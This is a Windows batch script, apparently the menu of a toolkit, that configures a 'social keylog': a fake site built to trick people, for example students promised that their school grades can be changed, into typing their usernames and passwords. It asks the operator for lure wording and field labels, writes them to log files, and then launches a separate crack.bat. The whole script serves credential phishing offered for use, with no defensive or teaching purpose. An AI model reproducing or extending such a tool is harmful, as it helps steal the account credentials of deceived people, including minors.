@echo off
color b
title Menu of Social Keylog

echo.
echo This program lets you create a local keylogger for a website.
echo For example, create a site to make people believe that they can change their school grades.
echo The purpose of this "social keylog" is to make a person write down their identifiers 
echo and to do this you can customise the keylogger :
echo.
echo READ HELP.txt in ..EloSuite\social-key\help.txt
echo.

echo Enter the name of the programm :
echo.
set /p title=Title:
cd LogUser
echo %title% >> LogTitleUser.txt
cd..
echo.

echo Enter a synonym for "Identifiant" or "Username":
set /p user= Word:
cd LogUser
echo %user% >> LogNameUser.txt
cd ..
echo.

echo Enter a synonym for "Password":
set /p pass= Word:
cd LogUser
echo %pass% >> LogPassUser.txt
cd ..
echo.


echo Enter what you want people to believe you can change (Example: School mark)
set /p Obj1=Trap 1:
cd LogUser
echo %Obj1% >> LogTrap1User.txt
cd ..
echo.

echo Indicate what you want people to believe you can change (example: a school subject).
echo.
echo It must be related to the first word.
set /p Obj2=Trap 2:
cd LogUser
echo %Obj2% >> LogTrap2User.txt
cd ..
echo.


pause

echo.
echo The program is ready, run the crack.bat script in Crack folder !
echo.
pause
cd Crack
start crack.bat
exit